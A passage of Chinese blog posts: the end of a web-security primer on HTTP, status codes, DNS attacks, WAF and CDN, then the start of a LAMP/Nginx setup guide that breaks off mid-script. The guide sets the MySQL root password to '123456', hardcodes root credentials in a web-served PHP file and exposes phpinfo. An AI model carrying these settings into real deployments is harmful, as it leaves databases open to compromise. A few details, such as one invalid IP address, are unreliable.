Apache在本阶段的主要工作：在回复已经发送给客户端之后记录事务。模块可能修改或者替换Apache的标准日志记录。</p><p>11、CleanUp阶段 : Apache在本阶段的主要工作：清理本次请求事务处理完成之后遗留的环境，比如文件、目录的处理或者Socket的关闭等等，这是Apache一次请求处理的最后一个阶段。</p><h1 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h1><p>HTTP （HyperText Transfer Protocal，超文本传输协议） 是应用层协议，使用 TCP 协议进行数据传输，常用端口号为 80，用于实现 Web 客户端 和 Web 服务器之间的通信。HTTP 协议规定了客户端和服务端之间通信的报文格式以及数据交换的流程。</p><p>HTTP是一种无状态协议，与WEB浏览器之间不会建立永久连接；当服务器返回响应后，就会关闭与服务器之间的连接，只有在重新发起请求的时候才会重新建立连接（服务器不主动连接，连接由客户端发起）</p><p>计算机主要通过浏览器的URL进行HTTP请求发送。</p><h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p>URL(Uniform Resource Locator),即统一资源定位符,是专为标识Internet网上资源位置而设置的一种编址方式，我们平时所说的网页地址指的即是URL。互联网上的每个文件都有一个唯一的URL，它包含的信息指出文件的位置以及浏览器应该怎么处理它。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">协议:&#x2F;&#x2F;用户名:密码@子域名.域名.顶级域名（服务器IP）:端口号&#x2F;目录&#x2F;文件名.文件后缀?参数&#x3D;值</span><br></pre></td></tr></table></figure><p>在linux中可以使用<code>curl</code>命令发送HTTP请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#访问HTTP响应数据</span><br><span class="line">curl http:&#x2F;&#x2F;www.baidu.com</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201221225142635.png" alt="image-20201221225142635"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#回显HTTP响应头部数据</span><br><span class="line">curl http:&#x2F;&#x2F;www.baidu.com -I</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201221225334555.png" alt="image-20201221225334555"></p><p>从<code>curl</code>命令的结果，可以认为浏览器的作用是渲染HTTP响应信息包</p><h2 id="HTTP协议的结构"><a href="#HTTP协议的结构" class="headerlink" title="HTTP协议的结构"></a>HTTP协议的结构</h2><p>HTTP报文由客户机到服务器的请求和从服务器到客户机的相应构成。</p><h3 id="①-请求报文的组成："><a href="#①-请求报文的组成：" class="headerlink" title="① 请求报文的组成："></a>① 请求报文的组成：</h3><p><strong>请求行 + 信息头 + 请求头 + 实体头 + 报文主体</strong></p><p>请求行的格式如下：</p><p><strong>Method [分隔符] Request - URL [分隔符] HTTP-Version CRLF</strong></p><p>解释说明：</p><p>（1）Method 表示完成Request - URL的方法，该字段是大小写敏感的，据<a href="http://dl.dbank.com/c05bnl6946">RFC2616</a>标准（现行的HTTP/1.1）得知，通常有以下8种方法：</p><table><thead><tr><th align="left">方法</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">HEAD</td><td align="left">HEAD方法跟GET方法相同，只不过服务器响应时不会返回消息体</td></tr><tr><td align="left">PUT</td><td align="left">把消息本体中的消息发送到一个URL,跟POST类似</td></tr><tr><td align="left">TRACE</td><td align="left">是用来调用一个远程的请求信息应用程序层的循环后退</td></tr><tr><td align="left">CONNECT</td><td align="left">HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。</td></tr><tr><td align="left">DELETE</td><td align="left">请求服务器删除Request-URI所标识的资源</td></tr><tr><td align="left">GET</td><td align="left">由客户端请求服务端获取Request-URI所标识的资源的方法</td></tr><tr><td align="left">POST</td><td align="left">由客户端向服务端提交Request-URI所标识的资源后附加新的数据</td></tr><tr><td align="left">OPTIONS</td><td align="left">请求获得由Request-URI标识的资源在请求/响应的通信过程中可以使用的功能选项</td></tr></tbody></table><p>（2）[分隔符]为空格</p><p>（3）Request - URL： 遵循URL格式，此字段为星号（*）时，说明请求并不用于某个特定的资源地址，而是用于服务本身。</p><p>（4）HTTP-Version：表示支持的HTTP版本，如HTTP/1.1</p><p>（5）CRLF：表示换行回车符</p><p><strong>HTTP的头</strong>包括通用的信息头、请求头、响应头、实体头4部分，每个头域由一个域名、冒号和值域3部分组成。域名是大小写无关的；域值前可以添加任何数量的空格，每个HTTP请求可以包含多个HTTP头域。</p><p><strong>HTTP报文主体</strong>则包含了HTTP请求的内容，对于get方法，报文主体为空，对于post方法，报文主体则包含需要发送给服务器的数据。</p><h3 id="②-响应报文的组成："><a href="#②-响应报文的组成：" class="headerlink" title="② 响应报文的组成："></a>② 响应报文的组成：</h3><p><strong>状态行 + 信息头 + 响应头 + 实体头 + 报文主体</strong></p><p>解释说明：</p><p>（1）状态行由状态码和原因分析两部分组成，其中，状态码由3位数字组成，表示请求是否被理解或被满足，用来支持自动操作；原因分析是对原文的状态码作简单的描述，用于供用户使用。</p><h3 id="③HTTP状态码"><a href="#③HTTP状态码" class="headerlink" title="③HTTP状态码"></a>③HTTP状态码</h3><table><thead><tr><th align="left">分类</th><th align="left">分类描述</th></tr></thead><tbody><tr><td align="left">1**</td><td align="left">信息，服务器收到请求，需要请求者继续执行操作</td></tr><tr><td align="left">2**</td><td align="left">成功，操作被成功接收并处理</td></tr><tr><td align="left">3**</td><td align="left">重定向，需要进一步的操作以完成请求</td></tr><tr><td align="left">4**</td><td align="left">客户端错误，请求包含语法错误或无法完成请求</td></tr><tr><td align="left">5**</td><td align="left">服务器错误，服务器在处理请求的过程中发生了错误</td></tr></tbody></table><p><strong>HTTP状态码列表</strong></p><table><thead><tr><th align="left">状态码</th><th align="left">状态码英文名称</th><th align="left">中文描述</th></tr></thead><tbody><tr><td align="left">100</td><td align="left">Continue</td><td align="left">继续。客户端应继续其请求</td></tr><tr><td align="left">101</td><td align="left">Switching Protocols</td><td align="left">切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议</td></tr><tr><td align="left">200</td><td align="left">OK</td><td align="left">请求成功。一般用于GET与POST请求</td></tr><tr><td align="left">201</td><td align="left">Created</td><td align="left">已创建。成功请求并创建了新的资源</td></tr><tr><td align="left">202</td><td align="left">Accepted</td><td align="left">已接受。已经接受请求，但未处理完成</td></tr><tr><td align="left">203</td><td align="left">Non-Authoritative Information</td><td align="left">非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本</td></tr><tr><td align="left">204</td><td align="left">No Content</td><td align="left">无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档</td></tr><tr><td align="left">205</td><td align="left">Reset Content</td><td align="left">重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域</td></tr><tr><td align="left">206</td><td align="left">Partial Content</td><td align="left">部分内容。服务器成功处理了部分GET请求</td></tr><tr><td align="left">300</td><td align="left">Multiple Choices</td><td align="left">多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择</td></tr><tr><td align="left">301</td><td align="left">Moved Permanently</td><td align="left">永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替</td></tr><tr><td align="left">302</td><td align="left">Found</td><td align="left">临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI</td></tr><tr><td align="left">303</td><td align="left">See Other</td><td align="left">查看其它地址。与301类似。使用GET和POST请求查看</td></tr><tr><td align="left">304</td><td align="left">Not Modified</td><td align="left">未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源</td></tr><tr><td align="left">305</td><td align="left">Use Proxy</td><td align="left">使用代理。所请求的资源必须通过代理访问</td></tr><tr><td align="left">306</td><td align="left">Unused</td><td align="left">已经被废弃的HTTP状态码</td></tr><tr><td align="left">307</td><td align="left">Temporary Redirect</td><td align="left">临时重定向。与302类似。使用GET请求重定向</td></tr><tr><td align="left">400</td><td align="left">Bad Request</td><td align="left">客户端请求的语法错误，服务器无法理解</td></tr><tr><td align="left">401</td><td align="left">Unauthorized</td><td align="left">请求要求用户的身份认证</td></tr><tr><td align="left">402</td><td align="left">Payment Required</td><td align="left">保留，将来使用</td></tr><tr><td align="left">403</td><td align="left">Forbidden</td><td align="left">服务器理解请求客户端的请求，但是拒绝执行此请求</td></tr><tr><td align="left">404</td><td align="left">Not Found</td><td align="left">服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置”您所请求的资源无法找到”的个性页面</td></tr><tr><td align="left">405</td><td align="left">Method Not Allowed</td><td align="left">客户端请求中的方法被禁止</td></tr><tr><td align="left">406</td><td align="left">Not Acceptable</td><td align="left">服务器无法根据客户端请求的内容特性完成请求</td></tr><tr><td align="left">407</td><td align="left">Proxy Authentication Required</td><td align="left">请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权</td></tr><tr><td align="left">408</td><td align="left">Request Time-out</td><td align="left">服务器等待客户端发送的请求时间过长，超时</td></tr><tr><td align="left">409</td><td align="left">Conflict</td><td align="left">服务器完成客户端的 PUT 请求时可能返回此代码，服务器处理请求时发生了冲突</td></tr><tr><td align="left">410</td><td align="left">Gone</td><td align="left">客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置</td></tr><tr><td align="left">411</td><td align="left">Length Required</td><td align="left">服务器无法处理客户端发送的不带Content-Length的请求信息</td></tr><tr><td align="left">412</td><td align="left">Precondition Failed</td><td align="left">客户端请求信息的先决条件错误</td></tr><tr><td align="left">413</td><td align="left">Request Entity Too Large</td><td align="left">由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息</td></tr><tr><td align="left">414</td><td align="left">Request-URI Too Large</td><td align="left">请求的URI过长（URI通常为网址），服务器无法处理</td></tr><tr><td align="left">415</td><td align="left">Unsupported Media Type</td><td align="left">服务器无法处理请求附带的媒体格式</td></tr><tr><td align="left">416</td><td align="left">Requested range not satisfiable</td><td align="left">客户端请求的范围无效</td></tr><tr><td align="left">417</td><td align="left">Expectation Failed</td><td align="left">服务器无法满足Expect的请求头信息</td></tr><tr><td align="left">500</td><td align="left">Internal Server Error</td><td align="left">服务器内部错误，无法完成请求</td></tr><tr><td align="left">501</td><td align="left">Not Implemented</td><td align="left">服务器不支持请求的功能，无法完成请求</td></tr><tr><td align="left">502</td><td align="left">Bad Gateway</td><td align="left">作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应</td></tr><tr><td align="left">503</td><td align="left">Service Unavailable</td><td align="left">由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中</td></tr><tr><td align="left">504</td><td align="left">Gateway Time-out</td><td align="left">充当网关或代理的服务器，未及时从远端服务器获取请求</td></tr><tr><td align="left">505</td><td align="left">HTTP Version not supported</td><td align="left">服务器不支持请求的HTTP协议的版本，无法完成处理</td></tr></tbody></table><h2 id="实例说明"><a href="#实例说明" class="headerlink" title="实例说明"></a>实例说明</h2><p>无论是请求报文还是响应报文，虽然分别由以上五个部分组成，但是在一定情况下有些并不是必须要的，但是对于：General-header(通用头部)、请求头（客户端-&gt;服务器[Request Header])、响应头(服务端-&gt;客户端[Response Header]) 这三部分是必须要有的。于是拿一个实例来对这三部分的内容进行说明记录：</p><p>（1）<strong>General-header(通用头部)</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Request URL: http:&#x2F;&#x2F;115.148.141.110:8980&#x2F;v1&#x2F;purchase&#x2F;list   　 # 请求的URL地址（包含请求类型、请求域名、请求端口、请求地址）</span><br><span class="line">Request Method: POST            　　　　　　　　　　　　　　　　　　 # 请求方式</span><br><span class="line">Status Code: 200 OK                                            # 响应的状态码、结果 </span><br><span class="line">Remote Address: 127.0.0.1:8899                                 # 请求的远程地址       </span><br><span class="line">Referrer Policy: no-referrer-when-downgrade                    # referrer策略（五种方法）</span><br></pre></td></tr></table></figure><p>（2）<strong>请求头（客户端-&gt;服务器[Request Header])</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;v1&#x2F;purchase&#x2F;list HTTP&#x2F;1.1       # 请求方式、请求地址、请求所使用的协议和版本</span><br><span class="line">Host: 115.157.151.673:8180            # 目标主机地址和端口号</span><br><span class="line">Connection: keep-alive                # 维护客户端和服务端的连接关系 </span><br><span class="line">Content-Length: 68                    # 描述HTTP消息实体的传输长度</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01     #发送端（客户端）希望接受的数据类型、q 是权重系数，范围 0 &#x3D;&lt; q &lt;&#x3D; 1，q 值越大，请求越倾向于获得其“;”之前的类型表示的内容</span><br><span class="line">Origin: http:&#x2F;&#x2F;apptest.zhidianlife.com:8007　　　　　　　　　 # 浏览器在referrer字段中只显示源网站的源地址（即协议、域名、端口），而不包括完整的路径  </span><br><span class="line">Authorization: c81e7286507f4aa4b6179f4c381b4c64　　　　　　　# 请求所需的认证信息</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.3; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;75.0.3770.100 Safari&#x2F;537.36          # 携带当前的用户代理信息，一般包含浏览器、浏览器内核和操作系统的版本型号信息。</span><br><span class="line">Content-Type: application&#x2F;json   　　　　　　　　　　　# 请求实体，文档类型</span><br><span class="line">Referer: http:&#x2F;&#x2F;apptest.zhidianlife.com:8007&#x2F;procurement&#x2F;order?_t&#x3D;756512&amp;_winid&#x3D;w9290         #  常用于同源限制策略，表示请求发起来源的URI，也就是当前页面资源的父页面。通过追踪Referer可得出资源页面之间复杂的跳转链。</span><br><span class="line">Accept-Encoding: gzip, deflate        # 客户端接收编码类型，一些网络压缩格式： gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9       # 客户端接收的语言类型 、中文</span><br></pre></td></tr></table></figure><p>（3）<strong>响应头(服务端-&gt;客户端[Response Header])</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK             # 请求协议以及本版、请求状态码</span><br><span class="line">Date: Tue, 02 Jul 2019 14:07:31 GMT # 服务端响应客户端的内容过期时间</span><br><span class="line">Content-Type: application&#x2F;json; charset&#x3D;utf-8     # 服务端发送的类型及采用的编码方式</span><br><span class="line">Server: Kestrel         　　　　　　　# WEB 服务器 服务端的Web服务端名</span><br><span class="line">Vary: Origin  # WEB服务器用该头部的内容告诉 Cache 服务器，在什么条件下才能用本响应所返回的对象响应后续的请求</span><br><span class="line">Access-Control-Allow-Credentials: true　　# 允许运行客户端携带证书式访问   </span><br><span class="line">Access-Control-Allow-Origin: http:&#x2F;&#x2F;apptest.zhidianlife.com:8007</span><br><span class="line">Content-Length: 33310　　　　　　　　 # 允许指定的域名、地址访问</span><br></pre></td></tr></table></figure><h1 id="潜在的安全问题"><a href="#潜在的安全问题" class="headerlink" title="潜在的安全问题"></a>潜在的安全问题</h1><p><strong>DNS 解析的安全问题：</strong></p><ul><li><p><strong>DNS域名劫持</strong>，攻击者通过对域名解析服务器的攻击或伪造，把目标网站的域名解析到错误（黑客准备）的页面，从而达到攻击者的某种目的。</p><p>防范措施：进行IP地址和MAC地址的绑定；使用域名系统的安全协议；对DNS数据包进行监测；使用IP进行访问等。</p></li><li><p><strong>DNS 缓存投毒</strong>，通过利用网民ISP端的DNS缓存服务器的漏洞进行攻击或控制，从而改变该ISP内的用户访问域名的响应结果;或者通过利用用户权威域名服务器上的漏洞，如当用户权威域名服务器同时可以被当作缓存服务器使用，黑客可以实现缓存投毒，将错误的域名纪录存入缓存中，从而使所有使用该缓存服务器的用户得到错误的DNS解析结果。</p></li><li><p><strong>DNS拒绝服务攻击</strong>，利用DNS软件版本漏洞攻击；利用僵尸网络中大量的被控主机，伪装成被攻击主机，在特定时间点上，连续向多个允许递归查询的DNS服务器发送大量的DNS查询请求，迫使其提供应答服务，经DNS服务器放大后的大量应答数据发送到被攻击主机，形成攻击流量，导致其无法提供正常服务甚至瘫痪。</p><blockquote><p>相关文章分享：<a href="https://mp.weixin.qq.com/s/ByOpNmN6JIMRdTT8E9DkoQ">真的黑客能让你分分钟开进沟里，但他们不屑于此</a></p></blockquote></li></ul><p><strong>HTTP的安全问题：</strong></p><ul><li>Http的通信是明文的，存在被窃听的风险</li><li>无法确认通信双方身份，有可能会被人伪造</li><li>无法验证报文的完整性，无法验证是否被篡改过</li></ul><h1 id="WAF和CDN"><a href="#WAF和CDN" class="headerlink" title="WAF和CDN"></a>WAF和CDN</h1><ul><li><strong>WAF</strong></li></ul><p>WAF(Web Application Firewall)称为web应用防火墙，是通过执行一系列针对HTTP,HTTPS的安全策略，来专门对web应用提供保护的一款产品，对来自Web应用程序客户端的各类请求进行内容检测和验证，确保其安全性与合法性，对非法的请求予以实时阻断，为Web应用提供防护。通俗的说，WAF类似于地铁站的安检，对于HTTP请求进行快速安全检查，通过解析HTTP数据，在不同的字段分别在特征、规则等维度进行判断，判断的结果作为是否拦截的依据从而决定是否放行。</p><p> WAF 可以用来屏蔽常见的网站漏洞攻击，如SQL注入，XML注入、XSS等。一般针对的是应用层而非网络层的入侵，从技术角度应该称之为Web IPS。其防护重点是SQL注入。</p><p>  Web防火墙产品部署在Web服务器的前面，串行接入，不仅在硬件性能上要求高，而且不能影响Web服务，所以HA功能、Bypass功能都是必须的，而且还要与负载均衡、Web Cache等Web服务器前的常见的产品协调部署。</p><ul><li><strong>CDN</strong></li></ul><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201222175832644.png" alt="image-20201222175832644"></p><p>这个url中有cdn字样。什么是CDN? 如果我在广州访问淘宝，跨省的通信必然造成延迟，如果淘宝在广东建立一个服务器，静态资源我可以直接从就近的广东服务器获取，必然能提高整个网站的打开速度，这就叫做CDN。CDN叫做内容分发网络，是依靠部署在各地的边缘服务器，使用户就近获取所需内容，降低网络拥塞，提高访问速度。</p><p>CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。</p><p>CDN将用户经常访问的静态数据资源直接缓存到节点服务器上，当用户再次请求时，会直接分发到在离用户近的节点服务器上响应给用户，当用户有实际数据交互时才会从远程Web服务器上响应，这样可以大大提高网站的响应速度及用户体验。CDN网络的诞生大大地改善了互联网的服务质量，因此传统的大型网络运营商纷纷开始建设自己的CDN网络。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://baike.baidu.com/tashuo/browse/content?id=46cc373d43f2830a7bae71ce&lemmaId=86062&fromLemmaModule=pcRight">什么是域名？我们为什么要保护它？</a></p><p><a href="https://blog.csdn.net/li_adou/article/details/78252202">域名解析的记录类型</a></p><p><a href="https://www.cnblogs.com/chalan630/p/12866009.html">web 安全之页面解析的流程学习</a></p><p><a href="https://blog.csdn.net/u010516151/article/details/102855151">web 页面解析的流程总结</a></p><p><a href="https://blog.csdn.net/qq_35732147/article/details/80661994">统一资源定位符（URL）详解</a></p><p><a href="https://www.cnblogs.com/wangyuyang1016/p/11681957.html#_caption2">Web页面解析过程（浅）</a></p><p><a href="https://blog.csdn.net/JackLiu16/article/details/79426241">DNS欺骗攻击及如何防护</a></p><p><a href="https://blog.csdn.net/gufenchen/article/details/93485351">WAF介绍</a></p><p><a href="https://blog.csdn.net/dushan1234/article/details/98073575">打开一个网页的全过程</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web环境搭建记录</title>
      <link href="posts/60533.html"/>
      <url>posts/60533.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>LAMP环境搭建 ：Linux + Apache + MySQL + PHP</p><p>搭建方式：包管理安装（用apt-get逐个安装Apache、MySQL、PHP）</p><p>以下操作在Ubuntu20.04系统上进行</p></blockquote><h1 id="0x01-安装Apache"><a href="#0x01-安装Apache" class="headerlink" title="0x01 安装Apache"></a>0x01 安装Apache</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install apache2</span><br></pre></td></tr></table></figure><p>在浏览器中访问<code>127.0.0.1</code>,出现如下页面则代表安装成功</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210804171612211.png" alt="image-20210804171612211"></p><h1 id="0x02-安装MySQL"><a href="#0x02-安装MySQL" class="headerlink" title="0x02 安装MySQL"></a>0x02 安装MySQL</h1><p>安装MySQL服务端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install mysql-server</span><br></pre></td></tr></table></figure><p>安装MySQL客户端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install mysql-client</span><br></pre></td></tr></table></figure><p>以root用户身份登录MySQL</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root</span><br></pre></td></tr></table></figure><p>为root用户设置密码’123456’</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED WITH mysql_native_password BY &#39;123456&#39;;</span><br></pre></td></tr></table></figure><p>退出MySQL</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; quit</span><br><span class="line">Bye</span><br></pre></td></tr></table></figure><p>后续再登录MySQL需使用刚才设置的密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">Enter password: </span><br></pre></td></tr></table></figure><h1 id="0x03-安装PHP"><a href="#0x03-安装PHP" class="headerlink" title="0x03 安装PHP"></a>0x03 安装PHP</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install php</span><br></pre></td></tr></table></figure><p>在 <code>/var/www/html</code> 下新建一个<code>phpinfo.php</code> 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /var/www/html/phpinfo.php</span><br></pre></td></tr></table></figure><p>编辑如下内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在浏览器中访问此文件，若能够看到PHP相关信息说明PHP安装成功且PHP代码能在此环境运行</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210805094043070.png" alt="image-20210805094043070"></p><blockquote><p>到此，LAMP环境算是初步部署好了。下面，简要记录下Nginx的安装，PHP连接MySQL的操作，以及相关加固技术。</p></blockquote><h1 id="0x04-安装Nginx"><a href="#0x04-安装Nginx" class="headerlink" title="0x04 安装Nginx"></a>0x04 安装Nginx</h1><p>Nginx与Apache都能提供Web服务，两者区别见 <a href="https://blog.csdn.net/lilygg/article/details/87873964">浅析Nginx与Apache的区别</a></p><p>有一点要说明的是，Apache对PHP支持比较简单，但Nginx本身不会对php文件进行解析，需要配合php-fpm（第三方的fastcgi进程管理器）才能实现对PHP的解析支持。</p><p>关于这一点详情可见 <a href="https://blog.csdn.net/hguisu/article/details/8930668">Nginx工作原理和优化总结</a></p><p>注意，如果Apache服务已经开启，在使用Nginx前需手动关闭Apache服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 stop</span><br></pre></td></tr></table></figure><p>安装Nginx</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install nginx</span><br></pre></td></tr></table></figure><p>如果之前没有安装过Apache，直接在浏览器中访问<code>127.0.0.1</code>,出现如下页面则代表nginx安装成功。若已安装过Apache，则访问<code>127.0.0.1/index.nginx-debian.html</code></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210805105118644.png" alt="image-20210805105118644"></p><p>但此时还无法运行php代码，还需安装php-fpm</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install php7.4-fpm</span><br></pre></td></tr></table></figure><p>以及修改nginx配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/nginx/sites-available/default</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210805121731351.png" alt="image-20210805121731351"></p><p><code>:wq</code>,保存退出后重启nginx服务，使修改过的配置信息生效</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service nginx restart</span><br></pre></td></tr></table></figure><p>然后和上面一样，成功访问<code>127.0.0.1/phpinfo.php</code>则说明nginx已经能够支持PHP</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210805122750141.png" alt="image-20210805122750141"></p><h1 id="0x05-PHP连接MySQL"><a href="#0x05-PHP连接MySQL" class="headerlink" title="0x05 PHP连接MySQL"></a>0x05 PHP连接MySQL</h1><p>方式：通过MySQLi扩展</p><p>安装mysqli扩展</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install php7.4-mysqli</span><br></pre></td></tr></table></figure><p>在<code> /var/www/html/</code>目录下创建<code>connect.php</code>，编辑内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dbhost</span> = <span class="string">&#x27;localhost&#x27;</span>; <span class="comment">// mysql服务器主机地址</span></span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&#x27;root&#x27;</span>;  <span class="comment">// mysql用户名</span></span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&#x27;123456&#x27;</span>; <span class="comment">// mysql用户对应的密码</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="variable">$dbhost</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="variable">$conn</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . mysqli_error());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;数据库连接成功!&#x27;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select user,host from mysql.user&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=mysqli_query(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span> (mysqli_num_rows(<span class="variable">$result</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// 输出数据</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$row</span> = mysqli_fetch_assoc(<span class="variable">$result</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&quot;user&quot;</span>].<span class="string">&quot;@&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;host&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    